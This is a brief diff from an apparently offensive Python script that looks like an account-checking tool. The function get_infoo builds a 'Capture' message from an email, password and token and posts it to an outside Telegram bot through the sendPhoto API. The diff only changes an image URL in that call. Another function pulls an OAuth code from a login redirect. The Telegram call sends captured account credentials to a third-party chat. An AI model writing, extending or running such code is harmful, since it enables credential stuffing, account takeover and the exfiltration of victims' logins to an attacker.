@@ -259,7 +259,7 @@ def get_infoo(Email, Password, token, CID) -> str:
  **𝗖𝗮𝗽𝘁𝘂𝗿𝗲 𝗕𝘆 🤳🏼:** @i3rei ®  
 ━━━━━━━━━━━━━━━━━━━━
 """
-    requests.get(f'https://api.telegram.org/bot{bi}/sendPhoto?chat_id={id}&photo=https://t.me/x0dayl/1&caption={message}&parse_mode=Markdown&reply_markup={{"inline_keyboard":[[{{"text":"Devloper","url":"http://t.me/i3rei"}}]]}}')	
+    requests.get(f'https://api.telegram.org/bot{bi}/sendPhoto?chat_id={id}&photo=https://t.me/x0dayl/&caption={message}&parse_mode=Markdown&reply_markup={{"inline_keyboard":[[{{"text":"Devloper","url":"http://t.me/i3rei"}}]]}}')	
      		
 def get_token(Email,Password,cook,hh) -> str:
 	Code = hh.get('Location').split('code=')[1].split('&')[0]
